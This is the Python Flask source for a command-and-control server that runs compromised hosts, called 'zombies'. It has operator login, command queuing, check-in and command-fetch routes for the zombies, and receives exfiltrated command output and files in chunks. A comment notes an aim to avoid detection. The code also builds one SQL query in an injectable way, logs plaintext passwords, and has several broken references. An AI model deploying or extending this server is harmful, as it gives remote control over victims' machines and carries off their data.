from flask import Flask, render_template, redirect, request, make_response, jsonify, send_from_directory, current_app
import base64
from server import ioFiles
# from os import path, environ, mkdir
from os import environ
import logging
from datetime import datetime
from pathlib import Path
import multiprocessing
from time import sleep

from database.database import Database


logger = logging.getLogger("server")
logging.basicConfig(level=logging.DEBUG, handlers=[
                        logging.FileHandler(f"c2_dev-{datetime.now().strftime('%Y%m%d_%H%S')}.log"),
                        logging.StreamHandler()
                    ], format="%(asctime)s |%(levelname)s| %(name)s->%(funcName)s => %(message)s    "
                    )

flask_log = logging.getLogger('werkzeug')
flask_log.setLevel(logging.ERROR)


class Server:
    app = Flask(__name__)

    #Should below also take a database object to manipulate on creation?
    def __init__(self,base_path):
        self.config_routes()
        logger.debug("routes configured")
        self.build_webdirs(base_path)
        logger.debug("web dirs built")
        self.db = Database()
        logger.debug("DB initialized")
        # Setup Flask App settings. 
        self.app.config['UPLOAD_FOLDER'] = 'files/post/'
        try:
            base_path = environ['base_path']
        except KeyError as e:
            logger.error("[-] Unable to find base_path variable, setting to defualt './'")
            base_path = './'
        # ROOT_PATH is for where the webserver templates live. 
        self.app.config['ROOT_PATH'] = base_path # not sure if this is needed
        home = environ['HOME']
        scrub = multiprocessing.Process(target=self.scrub_loop, args=(self.db,))
        scrub.start() # I want this in Server as well.
        logger.debug("Started scrub")
        # check if web-root exists

        # # This is currenlty failing and causing server to not run
        # self.app.config['ROOT_PATH'] = f"{os.environ["HOME"]}/"
        # if os.path(f'{home}/c2-base').exists(os.environ["HOME"]):
        #     logger.debug(f"{home}/c2-base exists, setting this to ROOT_PATH")
        #     self.app.config['ROOT_PATH'] = f"{home}/c2-base"
        # else:
        #     logger.debug(f"{home}/c2-base doesn't exists.")
        #     os.mkdir(f"{home}/c2-base")
        #     logger.debug("Created directory, now setting ROOT_PATH")
        #     self.app.config['ROOT_PATH'] = f"{home}/c2-base"

    def scrub_loop(self, db):
        """
        Continuously scrubs database tables in parallel and then recurses.
        """
        tables_to_scrub = ["sessions", "zombies", "commands", "data"]
        processes = []

        for table in tables_to_scrub:
            process = multiprocessing.Process(target=self.db.scrub_table, args=(table,))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()

        sleep(30)
        loop = multiprocessing.Process(target=self.scrub_loop, args=(db,))
        loop.start()
        loop.join()


    def config_routes(self):
        """
            # ToDo

            # ADMIN PAGES
            - A page to view status of all known zombies -> DONE
            - A page to send instructions to zombies -> DONE
                - way to kill zombies if needed
                    - remove them from DB
            - A page to view output from zombies (files, screenshots, cmd output, etc) -> Done but ugly
            - login functionality -> DONE

            # ZOMBIE PAGES
            - landing page for checkins -> DONE
                - if instruction is available, redirect based on request types (download, run cmd, upload, etc)
            - A page to handles pulling data from zombie -> DONE
            - A page that handles pushing data to zombies -> DONE 
            - TO_ADD:
                - Some form of Zombie Auth.

        """

        ### ADMIN PAGES
        """
        - handle authentication via a form. If successful, writes session to database and sets a session cookie
            - can also determine if user has a current session via cookie
        """
        @self.app.route("/",methods=['GET','POST'])
        @self.app.route("/login", methods=['GET','POST'])
        def login():
            logger.info(f"Recieved {request.method} request to /login from {request.remote_addr}")
            if request.method == "GET":
                token = request.cookies.get('Session')
                if token is not None:
                    logger.debug("Found token, attempting to auth")
                    auth = self.db.is_authd(token)
                    logger.debug(f"auth is {auth}")
                    if auth:
                        resp = make_response(redirect("/admin/zombies",302))
                        return resp
                    else:
                        logger.info(f"presented token: {token} wasn't found in DB!")
                        return render_template("login.html")
                else:
                    return render_template("login.html")
            elif request.method == "POST":
                #Needs input validation here to scrub user var for sqli
                user = request.form['username']
                enc_pass = self.db.hash(request.form['password'])
                logger.debug(f"user:{user}\npassword:{request.form['password']}\nenc_pass:{enc_pass}")
                db_user = self.db.is_user(user)
                if(db_user):
                    logger.debug(f"user:{user} was found!")
                    #check to see if enc_pass is same as admin pass
                    db_cred = self.db.get_enc_cred(user)
                    if db_cred is not None:
                        logger.debug(f"found db_cred:{db_cred}")
                        if enc_pass == db_cred:
                            #login successful
                            # - generate and save session token to db
                            # - Send token to client
                            # - redirect to dashboard
                            sesTok = self.db.get_token()
                            logger.debug(f"now saving session: {sesTok}")
                            res = self.db.create_session(user,sesTok)
                            resp = make_response(redirect("/admin/zombies",302))
                            resp.set_cookie('Session', sesTok)
                            return resp
                        else:
                            logger.debug(f"passwords didn't match whats in database!\npassword:{request.form['password']}\nenc:{enc_pass}")
                            resp = make_response(redirect("/login",302))
                            return resp
                    else:

                        #password wasn't found
                        #redirect back to login page
                        #may want to include logic for brute force protection
                        resp = make_response(redirect("/login",302))
                        return resp
                else:
                    logger.debug(f"user:{user} not found!")
                    resp = make_response(redirect("/login",302))
                    return resp
            else:
                resp = make_response(redirect("/login",302))
                return resp

        """
        - View all zombies. 
        """
        @self.app.route("/admin/zombies", methods=['GET'])
        def zombies():
            logger.info(f"Recieved {request.method} request to /admin/zombies from {request.remote_addr}")
            token = request.cookies.get('Session')
            if token is not None:
                auth = self.db.is_authd(token)
                logger.debug(f"auth is {auth}")
                if auth:
                    #Get a list of all available agents:
                    zombies = self.db.get_zombies()
                    return render_template('agents.html', z=zombies)
                else:
                    logger.debug(f"presented token {token} wasn't found in DB!")
                    return redirect("/login", 302)
            else:
                return redirect("/login", 302)

        """
        - Take a zombieID and save a dataBlob to data table for processing
            - will need a form to handle data input
        """
        @self.app.route("/admin/<zombieID>/", methods=['GET','POST'])
        def interact(zombieID):
            logger.info(f"Recieved {request.method} request to /admin/{zombieID} from {request.remote_addr}")
            if request.method == 'GET':
                token = request.cookies.get('Session')
                if token is not None:
                    auth = self.db.is_authd(token)
                    tok_for_zombie = self.db.get_all_dataTok(zombieID)
                    zID = zombieID
                    logger.debug(f"auth is {auth}")
                    if auth:
                        return render_template('execmd.html',d=tok_for_zombie,z=zID)
                    else:
                        logger.debug(f"presented token: {token} wasn't found in DB!")
                        return redirect("/login", 302)
                else:
                    return redirect("/login", 302)
            elif request.method == 'POST':
                command = request.form['command']
                self.db.add_command(command, zombieID)
                m = "Command Added!"
                return render_template("execmd.html",message=m,z=zombieID)
            else:
                logger.error(f"{request.remote_ip} presented {request.method}, redirecting")
                return redirect("/login", 302)
            
        """
         - Either present the text output of a command OR act as way to download files.
        """
        @self.app.route("/admin/<zombieID>/<token>",methods=['GET'])
        def zombieData(zombieID,token):
            logger.info(f"Recieved {request.method} request to /admin/{zombieID}/{token} from {request.remote_addr}")
            if request.method == 'GET':
                auth_token = request.cookies.get('Session')
                if auth_token is not None:
                    auth = self.db.is_authd(auth_token)
                    logger.debug(f"auth is {auth}")
                    if auth:
                        #Need to set up file or data and treat each differently
                        data = self.db.get_dataBlob(zombieID,token,"data")
                        logger.debug(f"Found data:{data}")
                        if data == 'FILE':
                            #render_template with link to file
                            logger.debug(f"FILE WAS FOUND: {token}")
                            cmd = "FILE"
                            #output = "LINK_TO_FILE"
                            return render_template('zombieData.html',c=cmd,token=token,z=zombieID)
                        else:
                            data = base64.b64decode(data.encode('utf-8')).decode('utf-8')
                            cmd = data.split("CMD:")[1]
                            cmd = cmd.split(":OUTPUT:")[0].strip()
                            logger.debug(f"cmd: {cmd}")
                            output = data.split("CMD:")[1].split(":OUTPUT:")[1].strip()
                            output = output.split('\n')
                            logger.debug(f"output: {output}")
                            return render_template('zombieData.html',c=cmd,o=output,z=zombieID)
                    else:
                        logger.debug(f"ZOMBIEDATA => presented token: {token} wasn't found in DB!")
                        return redirect("/login", 302)
                else:
                    return redirect("/login", 302)
            else:
                return redirect("/login", 302)

        """
        - Take a filename and serve it for download
        """
        @self.app.route('/downloads/<filename>', methods=['GET'])
        def download(filename):
            logger.info(f"Recieved {request.method} request to /downloads/{filename} from {request.remote_addr}")
            if request.method == 'GET':
                auth_token = request.cookies.get('Session')
                if auth_token is not None:
                    auth = self.db.is_authd(auth_token)
                    logger.debug(f"auth is {auth}")
                    if auth:
                        uploads = path.join(self.app.config['ROOT_PATH'], self.app.config['UPLOAD_FOLDER'])
                        logger.debug(f"UPLOADING FROM: {uploads}")
                        file = f"{filename}"
                        print(f"file is {uploads}/{file}")
                        return send_from_directory(uploads, file)
                    else:
                        logger.debug(f"TOKEN: {auth_token} INVALID")
                        return redirect("/login", 302)
                else:
                    return redirect("/login", 302)
            else:
                return redirect("/login", 302)


        ### ZOMBIE PAGES
        """
        zombies will periodically check in here.
        upon request, page will:
            -load any instructions from database for that zombieID
            -depending on action, will redirect to apropriate page.
                - If command available, redirect to recvFrom and return token, sleepLength
                - If NO command available, return sleepLength.
        """
        @self.app.route("/checkin", methods=['POST'])                                  
        def checkin():
            logger.info(f"Recieved {request.method} request to /checkin from {request.remote_addr}")
            content = request.get_json()
            zombieID = content['X-Client-ID']
            #logger.debug(f"found zombieID: {zombieID}")
            # Static value to determine how long to sleep, need build a way to set dynamically
            sleepLength = 3
            con = self.db.get_con(self.db.name)
            cur = self.db.get_cur(con)
            # check here if zombie has command available
            # First check if zombie exists
            if self.db.is_zombie(zombieID):
                logger.debug(f"found zombieID: {zombieID}")
                # NEED TO UPDATE SQL STATEMENTS, THIS CODE IS VULNERABLE
                cmd = f"select zombieID, token from commands where zombieID='{zombieID}'"
                cur.execute(cmd)
                res = cur.fetchone()
                #print(f"CHECKIN => results found: {res}")
                con.close()
                if res is None:
                    logger.debug(f"{zombieID}: No Commands available")
                    body = {"X-Server-Version":f"{sleepLength}"}
                    #resp = make_response("<body><p>OK</p></body>")
                    self.db.updateTime("zombies",zombieID)
                    return jsonify(body)
                else:
                    logger.debug(f"{zombieID}: Command FOUND!")
                    token = res[1]
                    logger.debug(f"Found token: {token}")
                    resp = make_response(redirect('/recvFrom',code=302))
                    resp.headers.add("Token",token)
                    resp.headers.add('X-Server-Version', sleepLength)
                    self.db.updateTime("zombies",zombieID)
                    return resp
            elif zombieID is not None:
                con.close()
                newHost = zombieID
                logger.debug(f"now attempting to add host to database")
                if self.db.add_zombie(newHost):
                    logger.debug(f"{newHost}: Added to db!")
                    body = {"X-Server-Version":f"{sleepLength}"}
                    return jsonify(body)
                else:
                    logger.debug(f"{newHost}: ERROR, NOT ADDED")
                    body = {"ERROR":"NOT ADDED"}
                    return jsonify(body), 500     
            else:
                con.close()
                logger.debug(f"CCould not find zombieID: {zombieID} and 'X-Client-Version' is {request.cookie.get('X-Client-Version')}")
                con.close()
                return make_response("<h1>Info Not Found</h1>", 403)
            
        
        """
        - Recieve data from client and store in database
        - If 'file' command is recieved, server has zombie fetch file and recieves it whole
            or in chunks depending on file size. 
            - Server saves file or chunks to ./files/pre/zombieID
            - Server decodes file from ./files/pre and saves to ./files/post/zombieID-token
            - Server deletes file from ./files/pre/zombieID
            - Server sends command to get file
            - zombie grabs file, encodes, then sends in pages if too large.

        - Nice to have:
            - generate dynamic urls here to avoid detection
        """
        @self.app.route("/sendto", methods=['POST'])
        def sendto():
            logger.info(f"Recieved {request.method} request to /sendto from {request.remote_addr}")
            content = request.get_json()
            data = content['data']
            zombieID = content['X-Client-ID']
            try:
                pageID = content['page']
            except:
                pageID = None
            #print(f"SENDTO => pageID: {pageID}")
            if pageID is not None:
                # handle files sent to server
                logger.debug(f"pageID:{pageID}")
                if pageID == 'END':
                    ioFile = ioFiles.ioFiles(zombieID)
                    if(ioFile.write_chunk(data)):
                        logger.debug("Last data has been written")
                    else:
                        logger.debug("ERROR WRITTING DATA")
                    body = {"X-Server-Version":"3"}
                    #add worker logic here
                    token = ioFile.process_file(zombieID)
                    logger.debug("Data Files have been processed")
                    #add database entry with zombieID and 'FILE' for blob
                    self.db.add_file(zombieID,token=token)
                    body = {"X-Server-Version":"3"}
                    return jsonify(body) 
                else:
                    logger.debug("SAVING CHUNK TO FILE")
                    ioFile = ioFiles.ioFiles(zombieID)
                    ioFile.write_chunk(data)
                    logger.debug("CHUNK SAVED")
                    body = {"X-Server-Version":"3"}
                    return jsonify(body)
            else:
                #no pages, just response data
                self.db.add_data(data,zombieID)
                body = {"X-Server-Version":"3"}
                return jsonify(body)

            #return render_template("sendto.html",d=data,z=zombieID)

        """
         - Zombies come here to recieve commands
            - zombies present ID and token sent from server. 
         - Outputs an encoded command for zombie to run.
        """
        @self.app.route("/recvFrom")
        def recvFrom():
            logger.info(f"Recieved {request.method} request to /recvFrom from {request.remote_addr}")
            content = request.get_json()
            token = content['Token']
            zombieID = content['X-Client-ID']
            dataBlob = self.db.get_dataBlob(zombieID,token,"commands")
            if dataBlob is not None:
                body = {"data":f"{dataBlob}"}
                self.db.remove_tok(zombieID,token,"commands")
                return jsonify(body)
            else:
                body = {"ERROR":"YOU SHOULDN'T BE HERE"}
                return jsonify(body)
              
    def run(self):
        self.app.run(port=8080)
        # self.app.run(port=8080, debug=True)

    def build_webdirs(self, base_path) -> bool:
        """
        build webroot dir structure based on base_path
        file structure:
        <path_to_c2-base>/
            /files
                /pre/
                /post/
                /stale/
        """
        base_dir = Path(base_path)
        if base_dir.is_dir():
            files = base_dir / "files"
            try:
                files.mkdir()
            except FileExistsError as e:
                logger.debug("dir 'files' already created, skipping")
            except Exception as e:
                logger.error(f"Unable to create directory structure with error {e}")
            for x in ["pre","post","stale"]:
                try:
                    to_add = files / x
                    to_add.mkdir()
                except FileExistsError:
                    continue
                except Exception as e:
                    logger.error(f"Couldn't create path {x}, found error: {e}")
                    return False
            return True
        else:
            try:
                base_dir.mkdir()
                self.build_dirs(str(base_path))
            except FileNotFoundError as e:
                logger.error(f"Unable to make path {str(base_dir)}, closing.")
                return False
            except Exception as e:
                logger.error(f"Unable to create directory, found error {e}")
                return False
